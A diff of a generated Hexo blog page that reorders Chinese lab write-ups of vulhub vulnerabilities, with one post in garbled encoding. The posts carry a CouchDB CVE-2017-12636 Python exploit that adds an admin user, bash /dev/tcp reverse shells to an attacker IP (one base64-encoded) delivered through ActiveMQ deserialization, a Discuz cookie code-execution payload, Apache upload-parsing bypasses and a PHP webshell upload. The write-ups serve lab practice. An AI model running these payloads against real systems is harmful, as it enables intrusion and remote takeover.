@@ -229,127 +229,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (10)/" itemprop="url">DNS����©��</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="DNS����©��"><a href="#DNS����©��" class="headerlink" title="DNS����©��"></a>DNS����©��</h1><p>DNSЭ��֧��ʹ��axfr���͵ļ�¼���������ͣ������������ͬ�������⡣�������Ա������DNS��������ʱ��û������������ȡ��¼����Դ�����ᵼ��DNS����©��<br>&emsp;<br>��Linux�£����ǿ���ʹ��dig����������dns���󡣱��磬���ǿ�����dig @your-ip <a href="http://www.vulhub.org��ȡ����www.vulhub.org��Ŀ��dns�������ϵ�A��¼��" target="_blank" rel="noopener">www.vulhub.org��ȡ����www.vulhub.org��Ŀ��dns�������ϵ�A��¼��</a><br><a href="https://imgchr.com/i/mARvnO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mARvnO.png" alt="mARvnO.png"></a><br>����axfr���͵�dns����dig @192.168.199.151 -t axfr vulhub.org��<br><a href="https://imgchr.com/i/mAWnEQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAWnEQ.png" alt="mAWnEQ.png"></a><br>�ɼ����һ�ȡ����vulhub.org��������������¼���������DNS����©����<br>����Ҳ������nmap script��ɨ���©����nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151��</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (7)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -425,127 +304,6 @@
 <h1 id="Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><p>漏洞原理<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>&emsp;<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br>复现漏洞<br>访问<a href="http://your-ip:5984/即可看到Couchdb的欢迎页面" target="_blank" rel="noopener">http://your-ip:5984/即可看到Couchdb的欢迎页面</a><br><a href="https://imgchr.com/i/mAwouR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwouR.png" alt="mAwouR.png"></a><br>&emsp;<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先【增加一个管理员用户】。这里上一个已经登录过了<br><a href="https://imgchr.com/i/mAwXCD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwXCD.png" alt="mAwXCD.png"></a><br>新增query_server配置，写入要执行的命令：<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘<br>“id &gt;/tmp/success”<br>&emsp;<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/zqd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/zqd&#39;</a><br>{“error”:”file_exists”,”reason”:”The database could not be created, the file already exists.”}<br>新建一个临时库和临时表，插入一条记录<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd&#39;</a><br>{“ok”:true}<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br>{“ok”:true,”id”:”vul”,”rev”:”1-967a00dff5e02add41819138abb3284d”}<br>调用query_server处理数据。<br>[root@localhost ~]# curl -X PUT <a href="http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”<br>{“ok”:true,”id”:”_design/vul”,”rev”:”1-ed713e4db9c7db605913fd62fb102ded”}<br>&emsp;<br>在kali上<br>执行EXP反弹Shell<br>根据上述发送的请求，可使用 python 编写EXP（实验文件exp.py）简化操作，修改EXP中的 target (目标机器地址)和 command （执行的命令），运行脚本即可执行对应的命令。<br>现在我们需要反弹一个可交互的Shell回操作机，本实验的思路是，在操作机中准备好反弹脚本并开启HTTP服务，然后利用EXP让目标 服务器 下载反弹脚本，接着，在操作机使用NC监听本地端口，最后利用EXP在目标服务器中执行反弹脚本，将Shell反弹至操作机监听的端口上，完成反弹Shell操作。<br>反弹Shell的命令，在经过数据库处理时不能直接执行，遂此处分为两步去实现<br>&emsp;<br>准备反弹脚本<br>cd 至 /home/目录下，使用Vim编辑器新建一个index.html文件，写入最终执行的命令，内容如下：<br>bash -i &gt;&amp; /dev/tcp/192.168.199.226/9000 0&gt;&amp;1 这里是本机ip<br><a href="https://imgchr.com/i/mA0ubq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0ubq.png" alt="mA0ubq.png"></a><br>这条命令意思为创建一个可交互的bash和一个到192.168.199.226:9000的TCP链接，然后将bash的输入输出错误都重定向到在191.168.199.226:9000监听的进程中。<br>&emsp;<br>2.另起一个终端，在/home/目录下执行 python -m SimpleHTTPServer 8000 ,开启HTTP服务<br><a href="https://imgchr.com/i/mA0G24" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0G24.png" alt="mA0G24.png"></a><br>3.修改 exp.py 中的 command 的值为 curl 192.168.199.226:8000 -o /tmp/bashell ,保存并执行命令 python exp.py<br>&emsp;</p>
 <p>#!/usr/bin/env python3<br>import requests<br>from requests.auth import HTTPBasicAuth<br>&emsp;<br>target = ‘<a href="http://192.168.199.217:5984&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984&#39;</a>      （这里是靶机ip）<br>command = ‘“curl 192.168.199.226:8000 -o /tmp/bashell”‘<br>version = 1<br>&emsp;<br>session = requests.session()<br>session.headers = {<br>    ‘Content-Type’: ‘application/json’<br>}</p>
 <h1 id="session-proxies"><a href="#session-proxies" class="headerlink" title="session.proxies = {"></a>session.proxies = {</h1><h1 id="‘http’-‘http-127-0-0-1-8085-39"><a href="#‘http’-‘http-127-0-0-1-8085-39" class="headerlink" title="‘http’: ‘http://127.0.0.1:8085&#39;"></a>‘http’: ‘<a href="http://127.0.0.1:8085&#39;" target="_blank" rel="noopener">http://127.0.0.1:8085&#39;</a></h1><h1 id><a href="#" class="headerlink" title="}"></a>}</h1><p>session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{<br>  “type”: “user”,<br>  “name”: “wooyun”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “wooyun”<br>}’’’)<br>&emsp;<br>session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)<br>&emsp;<br>if version == 1:<br>    session.put(target + (‘/_config/query_servers/cmd’), data=command)<br>else:<br>    host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]<br>    session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=command)<br>%emsp;<br>session.put(target + ‘/wooyun’)<br>session.put(target + ‘/wooyun/test’, data=’{“_id”: “wooyuntest”}’)<br>&emsp;<br>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br>开启http服务<br><a href="https://imgchr.com/i/mABiLR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABiLR.png" alt="mABiLR.png"></a><br>重新开启一台终端监听<br><a href="https://imgchr.com/i/mAB6YT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB6YT.png" alt="mAB6YT.png"></a><br>修改 exp.py 中的 command 的值为 bash /tmp/bashell ,保存并执行命令 python exp.py ,成功获取反弹回来的Shell<br><a href="https://imgchr.com/i/mAB2pF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB2pF.png" alt="mAB2pF.png"></a><br>在反弹回来的Shell中cd 到目录/tmp/下，可以看见运行Poc和Exp时存储的文件<br><a href="https://imgchr.com/i/mABfX9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABfX9.png" alt="mABfX9.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (8)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (8)/" itemprop="url">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。<br>&emsp;<br>搭建漏洞环境（这里我已经搭建好了  直接启动）<br>在相应的目录下启动<br>docker-compose up -d<br><a href="https://imgchr.com/i/mADyDA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADyDA.png" alt="mADyDA.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mADh8S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADh8S.png" alt="mADh8S.png"></a><br>启动后，访问<a href="http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。" target="_blank" rel="noopener">http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。</a><br><a href="https://imgchr.com/i/mAriUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAriUx.png" alt="mAriUx.png"></a><br>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<br>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();<br>&emsp;<br>phpinfo已成功执行：<br><a href="https://imgchr.com/i/mAr8G8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAr8G8.png" alt="mAr8G8.png"></a></p>
 
           
         
@@ -731,6 +489,127 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (8)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (8)/" itemprop="url">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。<br>&emsp;<br>搭建漏洞环境（这里我已经搭建好了  直接启动）<br>在相应的目录下启动<br>docker-compose up -d<br><a href="https://imgchr.com/i/mADyDA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADyDA.png" alt="mADyDA.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mADh8S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADh8S.png" alt="mADh8S.png"></a><br>启动后，访问<a href="http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。" target="_blank" rel="noopener">http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。</a><br><a href="https://imgchr.com/i/mAriUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAriUx.png" alt="mAriUx.png"></a><br>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<br>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();<br>&emsp;<br>phpinfo已成功执行：<br><a href="https://imgchr.com/i/mAr8G8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAr8G8.png" alt="mAr8G8.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -804,130 +683,6 @@
           
             <hr>
 <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。<br>1.漏洞利用过程如下：<br>a.构造（可以使用ysoserial）可执行命令的序列化对象<br>b.作为一个消息，发送给目标61616端口<br>c.访问的Web管理页面，读取消息，触发漏洞<br>&emsp;<br>1.使用jmet进行漏洞利用:<br>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>2.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/zqd” -Yp ROME   192.168.199.120  61616<br><a href="https://imgchr.com/i/mkbKun" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbKun.png" alt="mkbKun.png"></a><br>&emsp;<br>3现在我们可以通过<a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：</a><br><a href="https://imgchr.com/i/mkbcgH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbcgH.png" alt="mkbcgH.png"></a><br>&emsp;<br>5.点击查看这条消息即可触发命令执行<br><a href="https://imgchr.com/i/mkb78g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkb78g.png" alt="mkb78g.png"></a><br>&emsp;<br>6反弹shell:<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.207/8899 0&gt;&amp;1” -Yp ROME 192.168.199.120  61616<br>这里bash -i &gt;&amp; /dev/tcp/192.168.199.207/12340&gt;&amp;1”需要解码<br><a href="https://imgchr.com/i/mkqnPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqnPO.png" alt="mkqnPO.png"></a><br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4yMDcvODg5OSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.120 61616<br><a href="https://imgchr.com/i/mkqgiT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqgiT.png" alt="mkqgiT.png"></a><br>&emsp;<br>7 远程主机监听8899端口：<br>nc  -lvvp  8899<br>nc -l -p 8899<br><a href="https://imgchr.com/i/mkqqJO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqqJO.png" alt="mkqqJO.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (3)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld (3)/" itemprop="url">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br><a href="https://imgchr.com/i/mA9D91" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9D91.png" alt="mA9D91.png"></a><br>选上文件上传<br>———-4871560877<br>Content-Disposition: form-data; name=”name”</p>
-<p>mu.php<br>———-4871560877<br>Content-Disposition: form-data; name=”file”;filename=”1.jpg”</p>
-<?php phpinfo()?>
-<p>———-4871560877–<br><a href="https://imgchr.com/i/mA9bDS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9bDS.png" alt="mA9bDS.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mA9XNj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9XNj.png" alt="mA9XNj.png"></a><br>这里做一个截断<br><a href="https://imgchr.com/i/mACibF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACibF.png" alt="mACibF.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mACkE4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACkE4.png" alt="mACkE4.png"></a><br>访问主机ip:8080/zqd.php%0A,解析成功<br><a href="https://imgchr.com/i/mACMDO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACMDO.png" alt="mACMDO.png"></a></p>
 
           
         
@@ -1107,7 +862,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (4)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (3)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -1126,7 +881,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/07/25/ld (4)/" itemprop="url">Apache HTTPD 未知后缀解析漏洞</a></h1>
+                <a class="post-title-link" href="/2019/07/25/ld (3)/" itemprop="url">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</a></h1>
         
 
         <div class="post-meta">
@@ -1179,7 +934,10 @@
         
           
             <hr>
-<h1 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h1><p>改漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。<br>与其说这是漏洞，不如说是apache的特性，就是我们平常所说的从右向左解析是一样的。<br>当apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。<br>同样也可以在httpd.conf文件中更改参数或是直接配置.htaccess。<br>首先创建一个名为zqd.php.jpg的一句话木马。<br><a href="https://imgchr.com/i/mACdr8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACdr8.png" alt="mACdr8.png"></a><br>这里名称保存为zqd.php.jpg，是为了绕过黑名单机制<br>访问靶机 然后上传<br><a href="https://imgchr.com/i/mACc2q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACc2q.png" alt="mACc2q.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAC7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mAC7GR.png" alt="mAC7GR.png"></a><br>连接蚁剑<br><a href="https://imgchr.com/i/mACXqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACXqO.png" alt="mACXqO.png"></a><br>成功</p>
+<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br><a href="https://imgchr.com/i/mA9D91" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9D91.png" alt="mA9D91.png"></a><br>选上文件上传<br>———-4871560877<br>Content-Disposition: form-data; name=”name”</p>
+<p>mu.php<br>———-4871560877<br>Content-Disposition: form-data; name=”file”;filename=”1.jpg”</p>
+<?php phpinfo()?>
+<p>———-4871560877–<br><a href="https://imgchr.com/i/mA9bDS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9bDS.png" alt="mA9bDS.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mA9XNj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mA9XNj.png" alt="mA9XNj.png"></a><br>这里做一个截断<br><a href="https://imgchr.com/i/mACibF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACibF.png" alt="mACibF.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mACkE4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACkE4.png" alt="mACkE4.png"></a><br>访问主机ip:8080/zqd.php%0A,解析成功<br><a href="https://imgchr.com/i/mACMDO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACMDO.png" alt="mACMDO.png"></a></p>
 
           
         
@@ -1301,6 +1059,127 @@
           
             <hr>
